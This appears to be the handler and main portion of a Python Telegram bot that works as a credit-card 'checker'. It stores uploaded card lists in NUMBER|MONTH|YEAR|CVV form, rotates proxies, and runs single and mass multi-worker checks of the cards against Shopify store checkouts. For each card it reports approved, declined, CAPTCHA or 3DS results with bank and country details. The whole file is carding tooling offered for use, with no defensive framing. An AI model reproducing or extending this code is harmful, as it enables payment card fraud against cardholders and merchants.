        lines.append(f"✅ *ALIVE PROXIES (TOP 5):*")
        for i, r in enumerate(alive[:5]):
            display = r['proxy'].split(':')[0] + ':' + r['proxy'].split(':')[1]
            lines.append(f"  `{i+1}.` {display} · ⚡ {r['response_time']:.2f}s")
    
    if dead:
        lines.append(f"\n❌ *DEAD PROXIES:* `{len(dead)}`")
    
    await msg.edit_text("\n".join(lines), parse_mode="Markdown", reply_markup=reply_markup)

async def cleanproxies_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_data = await user_manager.get_user_data(user_id)
    proxies = user_data["proxies"]
    
    if not proxies:
        await update.message.reply_text("📭 No proxies to clean.")
        return
    
    msg = await update.message.reply_text(
        f"❖ *CLEANING PROXIES* ❖\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"Testing `{len(proxies)}` proxies...",
        parse_mode="Markdown"
    )
    
    health_checker = ProxyHealthChecker(db, user_id)
    results = await health_checker.check_all_proxies(proxies)
    
    alive_proxies = [r["proxy"] for r in results if r["alive"]]
    dead_count = len([r for r in results if not r["alive"]])
    
    await user_manager.update_user_data(user_id, proxies=alive_proxies)
    
    await msg.edit_text(
        f"🗑️ *PROXIES CLEANED* 🗑️\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"• ✅ KEPT: `{len(alive_proxies)}` alive proxies\n"
        f"• ❌ REMOVED: `{dead_count}` dead proxies",
        parse_mode="Markdown"
    )

# ===== COMANDOS DE TARJETAS =====
async def addcards(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "❖ *ADD CARDS* ❖\n"
        "━━━━━━━━━━━━━━━━━━━━━\n\n"
        "Send a `.txt` file with cards in format:\n"
        "`NUMBER|MONTH|YEAR|CVV`\n\n"
        "Example:\n"
        "`4377110010309114|08|2026|501`",
        parse_mode="Markdown"
    )

async def listcards(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_data = await user_manager.get_user_data(user_id)
    cards = user_data["cards"]
    
    if not cards:
        await update.message.reply_text(
            "📭 *NO CARDS FOUND*\n"
            "━━━━━━━━━━━━━━━━━━━━━\n\n"
            "Send a `.txt` file with cards to add them.",
            parse_mode="Markdown"
        )
        return
    
    lines = ["❖ *YOUR CARDS* ❖", "━━━━━━━━━━━━━━━━━━━━━", ""]
    for i, card in enumerate(cards, 1):
        bin_code = card.split('|')[0][:6]
        last4 = card.split('|')[0][-4:]
        lines.append(f"`{i}.` {bin_code}xxxxxx{last4}")
    
    if len(cards) > 10:
        lines.append(f"\n... and {len(cards)-10} more.")
    
    await update.message.reply_text("\n".join(lines), parse_mode="Markdown")

async def removecard(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text(
            "❖ *USAGE*: `/removecard [number]`\n"
            "EXAMPLE: `/removecard 2`\n\n"
            "Use `/listcards` to see card numbers.",
            parse_mode="Markdown"
        )
        return
    
    try:
        index = int(context.args[0]) - 1
    except:
        await update.message.reply_text("❌ Invalid number.")
        return
    
    user_id = update.effective_user.id
    user_data = await user_manager.get_user_data(user_id)
    cards = user_data["cards"]
    
    if index < 0 or index >= len(cards):
        await update.message.reply_text(f"❌ Invalid index. You have {len(cards)} cards.")
        return
    
    removed = cards.pop(index)
    await user_manager.update_user_data(user_id, cards=cards)
    
    bin_code = removed.split('|')[0][:6]
    last4 = removed.split('|')[0][-4:]
    
    await update.message.reply_text(
        f"🗑️ *CARD REMOVED*\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"Removed: `{bin_code}xxxxxx{last4}`\n"
        f"Remaining: `{len(cards)}` cards",
        parse_mode="Markdown"
    )

# ===== COMANDOS DE VERIFICACIÓN =====
async def sh_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) < 1:
        await update.message.reply_text(
            "❖ *SHOPIFY CUSTOM GATE* ❖\n"
            "━━━━━━━━━━━━━━━━━━━━━\n\n"
            "*USAGE*: `/sh [card]`\n"
            "*EXAMPLE*: `/sh 4377110010309114|08|2026|501`\n\n"
            "Use `/listsites` to see available sites.",
            parse_mode="Markdown"
        )
        return
    
    card_str = context.args[0]
    card_data = CardValidator.parse_card(card_str)
    if not card_data:
        await update.message.reply_text(
            "❌ *INVALID CARD FORMAT*\n"
            "━━━━━━━━━━━━━━━━━━━━━\n\n"
            "Use format: `NUMBER|MONTH|YEAR|CVV`\n"
            "Example: `4377110010309114|08|2026|501`",
            parse_mode="Markdown"
        )
        return
    
    user_id = update.effective_user.id
    
    allowed, msg = await user_manager.check_rate_limit(user_id)
    if not allowed:
        await update.message.reply_text(f"⏳ {msg}")
        return
    
    user_data = await user_manager.get_user_data(user_id)
    sites = user_data["sites"]
    proxies = user_data["proxies"]
    
    if not sites:
        await update.message.reply_text(
            "❌ *NO SITES FOUND*\n"
            "━━━━━━━━━━━━━━━━━━━━━\n\n"
            "Use `/addsite` to add a Shopify store first.",
            parse_mode="Markdown"
        )
        return
    
    if not proxies:
        await update.message.reply_text(
            "❌ *NO PROXIES FOUND*\n"
            "━━━━━━━━━━━━━━━━━━━━━\n\n"
            "Use `/addproxy` to add a proxy first.",
            parse_mode="Markdown"
        )
        return
    
    learning = LearningSystem(db, user_id)
    site, proxy = await learning.choose_combination(sites, proxies)
    
    msg = await update.message.reply_text(
        f"❖ *SHOPIFY CUSTOM GATE* ❖\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"*CARD*: `{card_data['bin']}xxxxxx{card_data['last4']}`\n"
        f"*SITE*: `{site}`\n"
        f"*STATUS*: 🔄 PROCESSING...",
        parse_mode="Markdown"
    )
    
    result = await card_service.check_single(user_id, card_data, site, proxy)
    await user_manager.increment_checks(user_id)
    
    if result.success:
        status_emoji = "✅"
        status_text = "APPROVED"
    elif result.status == CheckStatus.DECLINED:
        status_emoji = "❌"
        status_text = "DECLINED"
    elif result.status == CheckStatus.TIMEOUT:
        status_emoji = "⏱️"
        status_text = "TIMEOUT"
    elif result.status == CheckStatus.CAPTCHA:
        status_emoji = "🤖"
        status_text = "CAPTCHA"
    elif result.status == CheckStatus.THREE_DS:
        status_emoji = "🔒"
        status_text = "3DS REQUIRED"
    else:
        status_emoji = "❓"
        status_text = "ERROR"
    
    response = (
        f"{status_emoji} *SHOPIFY GATE RESULT* {status_emoji}\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"*CARD*: `{card_data['bin']}xxxxxx{card_data['last4']}`\n"
        f"*STATUS*: {status_emoji} {status_text}\n"
        f"*BANK*: `{result.bin_info.get('bank', 'Unknown')}`\n"
        f"*BRAND*: `{result.bin_info.get('brand', 'Unknown')}`\n"
        f"*COUNTRY*: `{result.bin_info.get('country', 'UN')}`\n"
        f"*AMOUNT*: `{result.price}`\n\n"
        f"*TIME*: `{result.response_time:.2f}s` · GATE: SH [CUSTOM]"
    )
    
    await msg.edit_text(response, parse_mode="Markdown")

async def msh_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    allowed, msg = await user_manager.check_rate_limit(user_id)
    if not allowed:
        await update.message.reply_text(f"⏳ {msg}")
        return
    
    user_data = await user_manager.get_user_data(user_id)
    cards = user_data["cards"]
    sites = user_data["sites"]
    proxies = user_data["proxies"]
    
    if not cards:
        await update.message.reply_text(
            "❌ *NO CARDS FOUND*\n"
            "━━━━━━━━━━━━━━━━━━━━━\n\n"
            "Send a `.txt` file with cards first.",
            parse_mode="Markdown"
        )
        return
    
    if not sites:
        await update.message.reply_text(
            "❌ *NO SITES FOUND*\n"
            "━━━━━━━━━━━━━━━━━━━━━\n\n"
            "Use `/addsite` to add a Shopify store first.",
            parse_mode="Markdown"
        )
        return
    
    if not proxies:
        await update.message.reply_text(
            "❌ *NO PROXIES FOUND*\n"
            "━━━━━━━━━━━━━━━━━━━━━\n\n"
            "Use `/addproxy` to add a proxy first.",
            parse_mode="Markdown"
        )
        return
    
    valid_cards = []
    for card_str in cards:
        card_data = CardValidator.parse_card(card_str)
        if card_data:
            valid_cards.append(card_data)
    
    num_workers = min(MAX_WORKERS_PER_USER, len(valid_cards))
    if context.args:
        try: num_workers = min(int(context.args[0]), MAX_WORKERS_PER_USER)
        except: pass
    
    msg = await update.message.reply_text(
        f"❖ *MASS SHOPIFY* ❖\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"*CARDS*: `{len(valid_cards)}`\n"
        f"*WORKERS*: `{num_workers}`\n"
        f"*STATUS*: 🔄 PROCESSING...",
        parse_mode="Markdown"
    )
    
    results, success_count, elapsed = await card_service.check_mass(
        user_id=user_id,
        cards=valid_cards,
        sites=sites,
        proxies=proxies,
        num_workers=num_workers,
        progress_callback=None
    )
    
    await user_manager.increment_checks(user_id)
    
    response = (
        f"✅ *MASS CHECK COMPLETE* ✅\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"*PROCESSED*: `{len(valid_cards)}` cards\n"
        f"*TIME*: `{elapsed:.2f}s`\n\n"
        f"*RESULTS*\n"
        f"• ✅ APPROVED: `{success_count}`\n"
        f"• ❌ DECLINED: `{len(valid_cards) - success_count}`"
    )
    
    await msg.edit_text(response, parse_mode="Markdown")

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    total = await db.fetch_one(
        "SELECT COUNT(*) as count FROM results WHERE user_id = ?",
        (user_id,)
    )
    total_count = total["count"] if total else 0
    
    charged = await db.fetch_one(
        "SELECT COUNT(*) as count FROM results WHERE user_id = ? AND status = 'charged'",
        (user_id,)
    )
    charged_count = charged["count"] if charged else 0
    
    await update.message.reply_text(
        f"📊 *BOT STATISTICS* 📊\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"*TOTAL CHECKS*: `{total_count}`\n"
        f"*APPROVED*: `{charged_count}`\n"
        f"*DECLINED*: `{total_count - charged_count}`\n\n"
        f"❖ *PROTECTION ACTIVE* ❖",
        parse_mode="Markdown"
    )

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    cancel_mass[user_id] = True
    await update.message.reply_text(
        f"⏹️ *PROCESS STOPPED*\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"All active processes have been terminated.",
        parse_mode="Markdown"
    )

# ===== MANEJO DE ARCHIVOS =====
async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    document = update.message.document
    if not document.file_name.endswith('.txt'):
        await update.message.reply_text("❌ Please send a .txt file.")
        return
    
    file = await context.bot.get_file(document.file_id)
    file_content = await file.download_as_bytearray()
    text = file_content.decode('utf-8', errors='ignore')
    lines = text.splitlines()
    
    cards_added = []
    invalid = []
    
    for line in lines:
        line = line.strip()
        if not line:
            continue
        if CardValidator.parse_card(line):
            cards_added.append(line)
        else:
            invalid.append(line)
    
    user_id = update.effective_user.id
    user_data = await user_manager.get_user_data(user_id)
    user_data["cards"].extend(cards_added)
    await user_manager.update_user_data(user_id, cards=user_data["cards"])
    
    await update.message.reply_text(
        f"📥 *CARDS IMPORTED* 📥\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"• ✅ VALID: `{len(cards_added)}`\n"
        f"• ❌ INVALID: `{len(invalid)}`\n\n"
        f"Total cards: `{len(user_data['cards'])}`",
        parse_mode="Markdown"
    )

# ===== CALLBACKS =====
async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    data = query.data
    if data.startswith("clean_"):
        user_id = int(data.split("_")[1])
        
        if query.from_user.id != user_id:
            await query.edit_message_text("❌ This action is not for you.")
            return
        
        user_data = await user_manager.get_user_data(user_id)
        proxies = user_data["proxies"]
        
        health_checker = ProxyHealthChecker(db, user_id)
        results = await health_checker.check_all_proxies(proxies)
        
        alive_proxies = [r["proxy"] for r in results if r["alive"]]
        dead_count = len([r for r in results if not r["alive"]])
        
        await user_manager.update_user_data(user_id, proxies=alive_proxies)
        
        await query.edit_message_text(
            f"🗑️ *PROXIES CLEANED* 🗑️\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"• ✅ KEPT: `{len(alive_proxies)}` alive proxies\n"
            f"• ❌ REMOVED: `{dead_count}` dead proxies",
            parse_mode="Markdown"
        )

# ================== MAIN ==================
async def shutdown(application: Application):
    logger.info("🛑 Shutting down...")
    if checker:
        await checker.shutdown()
    if db:
        await db.shutdown()
    logger.info("✅ Shutdown complete")

async def post_init(application: Application):
    global db, user_manager, checker, card_service
    
    db = Database()
    await db.initialize()
    
    user_manager = UserManager(db)
    checker = UltraFastChecker()
    await checker.initialize()
    
    card_service = CardCheckService(db, user_manager, checker)
    
    logger.info("✅ Bot initialized")

def main():
    app = Application.builder().token(TOKEN).post_init(post_init).build()
    app.post_shutdown = shutdown

    # Comandos
    app.add_handler(CommandHandler("start", start))
    
    # Sitios
    app.add_handler(CommandHandler("addsite", addsite))
    app.add_handler(CommandHandler("listsites", listsites))
    app.add_handler(CommandHandler("removesite", removesite))
    
    # Proxies
    app.add_handler(CommandHandler("addproxy", addproxy))
    app.add_handler(CommandHandler("listproxies", listproxies))
    app.add_handler(CommandHandler("removeproxy", removeproxy))
    app.add_handler(CommandHandler("proxyhealth", proxyhealth_command))
    app.add_handler(CommandHandler("cleanproxies", cleanproxies_command))
    
    # Tarjetas
    app.add_handler(CommandHandler("addcards", addcards))
    app.add_handler(CommandHandler("listcards", listcards))
    app.add_handler(CommandHandler("removecard", removecard))
    
    # Verificaciones
    app.add_handler(CommandHandler("sh", sh_command))
    app.add_handler(CommandHandler("msh", msh_command))
    
    # Stats
    app.add_handler(CommandHandler("stats", stats_command))
    app.add_handler(CommandHandler("stop", stop_command))
    
    # Archivos
    app.add_handler(MessageHandler(filters.Document.FileExtension("txt"), handle_document))
    
    # Callbacks
    app.add_handler(CallbackQueryHandler(button_callback))

    logger.info("🚀 Bot started (sin reintentos)")
    app.run_polling()

if __name__ == "__main__":
    main()
